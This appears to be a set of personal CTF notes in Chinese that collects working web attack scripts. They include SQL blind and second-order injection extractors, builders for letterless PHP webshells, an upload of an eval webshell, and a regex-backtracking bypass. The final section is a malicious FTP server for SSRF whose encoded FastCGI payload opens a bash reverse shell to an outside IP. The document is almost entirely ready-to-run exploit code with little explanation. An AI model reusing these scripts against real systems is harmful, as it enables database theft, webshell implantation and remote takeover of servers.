#### 将伪随机数转换成php_mt_seed可以识别的数据格式

```python
import requests
import random
dict1='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
dict2='KVQP0LdJKRaV3n9D'
dict3 = dict1[::-1]     
length = len(dict2)    
res=''
for i in range(len(dict2)):
    for j in range(len(dict1)):
        if dict2[i] == dict1[j]:
            res+=str(j)+' '+str(j)+' '+'0'+' '+str(len(dict1)-1)+' '
            break
print(res)
```



SQL盲注脚本

```python
import requests

url='http://bdeb176a-4425-4fe9-997e-02afb5312134.node3.buuoj.cn/index.php'
flag=''

for i in range(50):
    a = 32
    b = 128
    mid = (a+b)//2
    while(a<b):
        
         #stunum=0^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),1,1))>0)   爆表名
         
         #stunum=0^(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_schema=database())and(table_name='flag')),1,1))>0)  爆列名
        print(mid)
        payload = url+"?stunum=0^(ascii(substr((select(group_concat(value))from(flag)),%d,1))>%d)"%(i,mid)
        import time
        time.sleep(1)
        re = requests.get(url=payload)
        # 首先判断目标值 是否小于 
        if 'admin' in re.text:
            a = mid + 1
        else:
            # 目标值 大于 则直接 将 mid 赋值给 b
            b = mid
        mid = (a+b)//2
    # 这个二分查找的方式是 完整的走完一遍，也就是跑7次 
    if (mid==32|mid==128):
        break

    flag +=chr(mid)
    print(flag)

```

#### 盲注二次注入

```python
import requests,re

flag_hex = ''

# email=a9%40qq.com&username='%2bsubstr((hex(hex((select * from flag))))from 1 for 10)%2b'&password=1
url_reg = "http://024137a8-4186-4739-8cd8-41f6374a9248.node4.buuoj.cn:81/register.php"
url_login = "http://024137a8-4186-4739-8cd8-41f6374a9248.node4.buuoj.cn:81/login.php"

for i in range(100):
    reg_data = {
        'email': 'b%d@qq.com'%(i),
        'username': "'+substr((hex(hex((select * from flag))))from %d for 10)+'"%(i*10+1),
        'password': '1'
    }
    requests.post(url=url_reg, data=reg_data)

    data_login = {
        'email': 'b%d@qq.com'%(i),
        'password': '1'
    }
    res = requests.post(url=url_login, data=data_login)
    res = re.findall(r'<span class="user-name">(.*?)</span>', res.text,re.S)[0].strip()
    print(res)
    if res == '0':
        break
    flag_hex +=res
    

print(flag_hex)


```





#### 无字母数字webshell-异或绕过构建脚本

```python
import urllib.parse

find = ['a','q','u','_','i','s','c','t','e']
for i in range(1,256):
    for j in range(1,256):
        result = chr(i^j)
        if(result in find):
            a = i.to_bytes(1,byteorder='big')
            b = j.to_bytes(1,byteorder='big')
            a = urllib.parse.quote(a)
            b = urllib.parse.quote(b)
            print("%s:%s^%s"%(result,a,b))
            # ${%FF%FF%FF^%B8%BA%AB}{%FF^%A0}();
            # aqua_is_cute
            # %FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF%FF^%9E%8E%8A%9E%A0%96%8C%A0%9C%8A%8B%9A
        
```

```php
<?php

$l = "";
$r = "";
$argv = str_split("_POST");
for ($i = 0; $i < count($argv); $i++) {
    for ($j = 0; $j < 255; $j++) {
        $k = chr($j) ^ chr(255); // dechex(255) = ff
        if ($k == $argv[$i]) {
            if ($j < 16) {
                $l .= "%ff";
                $r .= "%0" . dechex($j);
                continue;
            }
            $l .= "%ff";
            $r .= "%" . dechex($j);
            continue;
        }
    }
}
echo "\{$l`$r\}";
```



#### 无字母数字webshell构造

```php
<?php
header('Content-Type: text/html; charset=utf-8');
$str = '当我站在山顶上俯瞰半个鼓浪屿和整个厦门的夜空的时候，我知道此次出行的目的已经完成了，我要开始收拾行李，明天早上离开这里。前几天有人问我，大学四年结束了，你也不说点什么？乌云发生了一些事情，所有人都缄默不言，你也是一样吗？你逃到南方，难道不回家了吗？当然要回家，我只是想找到我要找的答案。其实这次出来一趟很累，晚上几乎是热汗淋漓回到住处，厦门的海风伴着妮妲路过后带来的淅淅沥沥的小雨，也去不走我身上任何一个毛孔里的热气。好在旅社的生活用品一应俱全，洗完澡后我爬到屋顶。旅社是一个老别墅，说起来也不算老，比起隔壁一家旧中国时期的房子要豪华得多，竖立在笔山顶上与厦门岛隔海相望。站在屋顶向下看，灯火阑珊的鼓浪屿街市参杂在绿树与楼宇间，依稀还可以看到熙熙攘攘的游客。大概是夜晚渐深的缘故，周围慢慢变得宁静下来，我忘记白天在奔波什么，直到站在这里的时候，我才知道我寻找的答案并不在南方。当然也不在北方，北京的很多东西让我非常丧气，包括自掘坟墓的中介和颐指气使的大人们；北京也有很多东西让我喜欢，我喜欢颐和园古色古香的玉澜堂，我喜欢朝阳门那块“永延帝祚”的牌坊，喜欢北京鳞次栉比的老宅子和南锣鼓巷的小吃。但这些都不是我要的答案，我也不知道我追随的是什么，但想想百年后留下的又是什么，想想就很可怕。我曾经为了吃一碗臭豆腐，坐着优步从上地到北海北，兴冲冲地来到那个垂涎已久的豆腐摊前，用急切又害羞的口吻对老板说，来两份量的臭豆腐。其实也只要10块钱，吃完以后便是无与伦比的满足感。我记得那是毕业设计审核前夕的一个午后，五月的北京还不算炎热，和煦的阳光顺着路边老房子的屋檐洒向大地，但我还是不敢站在阳光下，春天的燥热难耐也绝不输给夏天。就像很多人冷嘲热讽的那样，做这一行谁敢把自己完全曝光，甭管你是黑帽子白帽子还是绿帽子。生活在那个时候还算美好，我依旧是一个学生，几天前辞别的同伴还在朝九晚五的工作，一切都照旧运行，波澜不远走千里吃豆腐这种理想主义的事情这几年在我身上屡屡发生，甚至南下此行也不例外。一年前的这个时候我许过一个心愿，在南普陀，我特为此来还愿。理想化、单纯与恋旧，其中单纯可不是一个多么令人称赞的形容，很多人把他和傻挂钩。“你太单纯了，你还想着这一切会好起来”，对呀，在男欢女爱那些事情上，我可不单纯，但有些能让人变得圆滑与世故的抉择中，我宁愿想的更单纯一些。去年冬天孤身一人来到北京，放弃了在腾讯做一个安逸的实习生的机会，原因有很多也很难说。在腾讯短暂的实习生活让我记忆犹新，我感觉这辈子不会再像一个小孩一样被所有人宠了，这些当我选择北漂的时候应该就要想到的。北京的冬天刺骨的寒冷，特别是2015年的腊月，有几天连续下着暴雪，路上的积雪一踩半步深，咯吱咯吱响，周遭却静的像深山里的古刹。我住的小区离公司有一段距离，才下雪的那天我甚至还走着回家。北京的冬天最可怕的是寒风，走到家里耳朵已经硬邦邦好像一碰就会碎，在我一头扎进被窝里的时候，我却慢慢喜欢上这个古都了。我想到《雍正皇帝》里胤禛在北京的鹅毛大雪里放出十三爷，那个拼命十三郎带着令牌取下丰台大营的兵权，保了大清江山盛世的延续与稳固。那一夜，北京的漫天大雪绝不逊于今日，而昔人已作古，来者尚不能及，多么悲哀。这个古都承载着太多历史的厚重感，特别是下雪的季节，我可以想到乾清宫前广场上千百年寂寞的雕龙与铜龟，屋檐上的积雪，高高在上的鸱吻，想到数百年的沧桑与朝代更迭。雪停的那天我去了颐和园，我记得我等了很久才摇摇摆摆来了一辆公交车，车上几乎没有人，司机小心翼翼地转动着方向盘，在湿滑的道路上缓慢前行。窗外白茫茫一片，阳光照在雪地上有些刺眼，我才低下头。颐和园的学生票甚至比地铁票还便宜。在昆明湖畔眺望湖面，微微泛着夕阳霞光的湖水尚未结冰，踩着那些可能被御碾轧过的土地，滑了无数跤，最后只能扶着湖边的石狮子叹气，为什么没穿防滑的鞋子。昆明湖这一汪清水，见证了光绪皇帝被囚禁十载的蹉跎岁月，见证了静安先生誓为先朝而自溺，也见证了共和国以来固守与开放的交叠。说起来，家里有本卫琪著的《人间词话典评》，本想买来瞻仰一下王静安的这篇古典美学巨著，没想到全书多是以批判为主。我自诩想当文人的黑客，其实也只是嘴里说说，真到评说文章是非的时候，我却张口无词。倒是誓死不去发，这点确实让我无限感慨：中国士大夫的骨气，真的是从屈原投水的那一刻就奠定下来的。有句话说，古往今来中国三大天才死于水，其一屈原，其二李白，其三王国维。卫琪对此话颇有不服，不纠结王国维是否能够与前二者相提并论，我单喜欢他的直白，能畅快评说古今词话的人，也许无出其右了吧。人言可畏、人言可畏，越到现代越会深深感觉到这句话的正确，看到很多事情的发展往往被舆论所左右，就越羡慕那些无所畏惧的人，不论他们是勇敢还是自负。此间人王垠算一个，网络上人们对他毁誉参半，但确实有本事而又不矫揉做作，放胆直言心比天高的只有他一个了。那天在昆明湖畔看过夕阳，直到天空变的无比深邃，我才慢慢往家的方向走。耳机放着后弦的《昆明湖》，不知不觉已经十年了，不知道这时候他有没有回首望望自己的九公主和安娜，是否还能够“泼墨造一匹快马，追回十年前姑娘”。后来，感觉一切都步入正轨，学位证也顺利拿到，我匆匆告别了自己的大学。后来也遇到了很多事，事后有人找我，很多人关心你，少数人可能不是，但出了学校以后，又有多少人和事情完全没有目的呢？我也考虑了很多去处，但一直没有决断，倒有念怀旧主，也有妄自菲薄之意，我希望自己能做出点成绩再去谈其他的，所以很久都是闭门不出，琢磨东西。来到厦门，我还了一个愿，又许了新的愿望，希望我还会再次来还愿。我又来到了上次没住够的鼓浪屿，订了一间安静的房子，只有我一个人。在这里，能听到的只有远处屋檐下鸟儿叽叽喳喳的鸣叫声，远处的喧嚣早已烟消云散，即使这只是暂时的。站在屋顶的我，喝下杯中最后一口水。清晨，背着行李，我乘轮渡离开了鼓浪屿，这是我第二次来鼓浪屿，谁知道会不会是最后一次。我在这里住了三天，用三天去寻找了一个答案。不知不觉我又想到辜鸿铭与沈子培的那段对话。“大难临头，何以为之？”“世受国恩，死生系之。”';
for($i=0; $i<mb_strlen($str, 'utf-8'); $i++)
{
    $st = mb_substr($str, $i,1, 'utf-8');
    $a = ~($st);
    $b = $a[1];				#取汉字的第一位
    if($b==$_GET['a'])		#$_GET['a']想要得到的字符
    {
        echo $st;exit;
    }
}
// 用法
//$_=~('北')[1]
//#s
//同理构造。system。为什么不构造eval呢。大家可以去尝试一下
//$a='system';
//$b='eval';
//这两者动态调用的区别
//system是个函数。可以动态调用。而eval是PHP语法的一部分。并不是函数。不能动态调用

?>

```



#### 无列名注入

```python
import requests

url='http://7a93d6a2-cc99-43d5-aaa6-aab30f35ff99.node4.buuoj.cn:81/'
payload='-1||((select 1,"{}")>(select * from f1ag_1s_h3r3_hhhhh))'
flag=''
for j in range(1,50):
    for i in range(32,128):
        hexchar=flag+chr(i)
        py=payload.format(hexchar)
        print(py)
        datas={'id':py}
        import time
        time.sleep(1)
        re=requests.post(url=url,data=datas)
        if 'Nu1L' in re.text:
            flag+=chr(i-1)
            print(flag)
            break

```



#### 正则回溯

```python
import requests
from io import BytesIO

data = {
  'treasure': BytesIO(b'flag.php' + b' a' * 1000000)
}

res = requests.post('http://119.61.19.217:57305/treasure.php', data=data)
print(res.text)

```



#### python文件上传

```python
import requests
from io import BytesIO

url = "http://8c8e609f-51ac-48b8-82ea-0f19cc24e3ea.node4.buuoj.cn:81/flflflflag.php?file=php://filter/string.strip_tags/resource=/etc/passwd"
payload = "<?php eval($_POST['cmd']);?>"
file_data = {"file": BytesIO(payload.encode())}
res = requests.post(url=url,files=file_data, allow_redirects=False)
print(res)

```



#### RC加密

```python
import base64
from urllib import parse

def rc4_main(key = "init_key", message = "init_message"):#返回加密后得内容
    s_box = rc4_init_sbox(key)
    crypt = str(rc4_excrypt(message, s_box))
    return  crypt

def rc4_init_sbox(key):
    s_box = list(range(256)) 
    j = 0
    for i in range(256):
        j = (j + s_box[i] + ord(key[i % len(key)])) % 256
        s_box[i], s_box[j] = s_box[j], s_box[i]
    return s_box
def rc4_excrypt(plain, box):
    res = []
    i = j = 0
    for s in plain:
        i = (i + 1) % 256
        j = (j + box[i]) % 256
        box[i], box[j] = box[j], box[i]
        t = (box[i] + box[j]) % 256
        k = box[t]
        res.append(chr(ord(s) ^ k))
    cipher = "".join(res)
    return (str(base64.b64encode(cipher.encode('utf-8')), 'utf-8'))

key = "HereIsTreasure"  #此处为密文
message = input("请输入明文:\n")
enc_base64 = rc4_main( key , message )
enc_init = str(base64.b64decode(enc_base64),'utf-8')
enc_url = parse.quote(enc_init)
print("rc4加密后的url编码:"+enc_url)
#print("rc4加密后的base64编码"+enc_base64)
```

#### SSRF-恶意的 ftp 服务器（一）

```python
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
s.bind(('0.0.0.0', 23))
s.listen(1)
conn, addr = s.accept()
conn.send(b'220 welcome\n')
#Service ready for new user.
#Client send anonymous username
#USER anonymous
conn.send(b'331 Please specify the password.\n')
#User name okay, need password.
#Client send anonymous password.
#PASS anonymous
conn.send(b'230 Login successful.\n')
#User logged in, proceed. Logged out if appropriate.
#TYPE I
conn.send(b'200 Switching to Binary mode.\n')
#Size /
conn.send(b'550 Could not get the file size.\n')
#EPSV (1)
conn.send(b'150 ok\n')
#PASV
conn.send(b'227 Entering Extended Passive Mode (127,0,0,1,0,9000)\n') #STOR / (2)
conn.send(b'150 Permission denied.\n')
#QUIT
conn.send(b'221 Goodbye.\n')
conn.close()
```

#### SSRF-恶意的 ftp 服务器（二）

```python
# -*- coding: utf-8 -*-
# @Time    : 2021/1/13 6:56 下午
# @Author  : tntaxin
# @File    : ftp_redirect.py
# @Software:

import socket
from urllib.parse import unquote

# 对gopherus生成的payload进行一次urldecode
payload = unquote("%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%05%05%00%0F%10SERVER_SOFTWAREgo%20/%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP/1.1%0E%03CONTENT_LENGTH106%0E%04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Aauto_prepend_file%20%3D%20php%3A//input%0F%17SCRIPT_FILENAME/var/www/html/index.php%0D%01DOCUMENT_ROOT/%00%00%00%00%00%01%04%00%01%00%00%00%00%01%05%00%01%00j%04%00%3C%3Fphp%20system%28%27bash%20-c%20%22bash%20-i%20%3E%26%20/dev/tcp/192.168.43.247/2333%200%3E%261%22%27%29%3Bdie%28%27-----Made-by-SpyD3r-----%0A%27%29%3B%3F%3E%00%00%00%00")
payload = payload.encode('utf-8')

host = '0.0.0.0'
port = 23
sk = socket.socket()
sk.bind((host, port))
sk.listen(5)

# ftp被动模式的passvie port,监听到1234
sk2 = socket.socket()
sk2.bind((host, 1234))
sk2.listen()

# 计数器，用于区分是第几次ftp连接
count = 1
while 1:
    conn, address = sk.accept()
    conn.send(b"200 \n")
    print(conn.recv(20))  # USER aaa\r\n  客户端传来用户名
    if count == 1:
        conn.send(b"220 ready\n")
    else:
        conn.send(b"200 ready\n")

    print(conn.recv(20))   # TYPE I\r\n  客户端告诉服务端以什么格式传输数据，TYPE I表示二进制， TYPE A表示文本
    if count == 1:
        conn.send(b"215 \n")
    else:
        conn.send(b"200 \n")

    print(conn.recv(20))  # SIZE /123\r\n  客户端询问文件/123的大小
    if count == 1:
        conn.send(b"213 3 \n")  
    else:
        conn.send(b"300 \n")

    print(conn.recv(20))  # EPSV\r\n'
    conn.send(b"200 \n")

    print(conn.recv(20))   # PASV\r\n  客户端告诉服务端进入被动连接模式
    if count == 1:
        conn.send(b"227 127,0,0,1,4,210\n")  # 服务端告诉客户端需要到哪个ip:port去获取数据,ip,port都是用逗号隔开，其中端口的计算规则为：4*256+210=1234
    else:
        conn.send(b"227 127,0,0,1,35,40\n")  # 端口计算规则：35*256+40=9000

    print(conn.recv(20))  # 第一次连接会收到命令RETR /123\r\n，第二次连接会收到STOR /123\r\n
    if count == 1:
        conn.send(b"125 \n") # 告诉客户端可以开始数据连接了
        # 新建一个socket给服务端返回我们的payload
        print("建立连接!")
        conn2, address2 = sk2.accept()
        conn2.send(payload)
        conn2.close()
        print("断开连接!")
    else:
        conn.send(b"150 \n")
        print(conn.recv(20))
        exit()

    # 第一次连接是下载文件，需要告诉客户端下载已经结束
    if count == 1:
        conn.send(b"226 \n")
    conn.close()
    count += 1
```

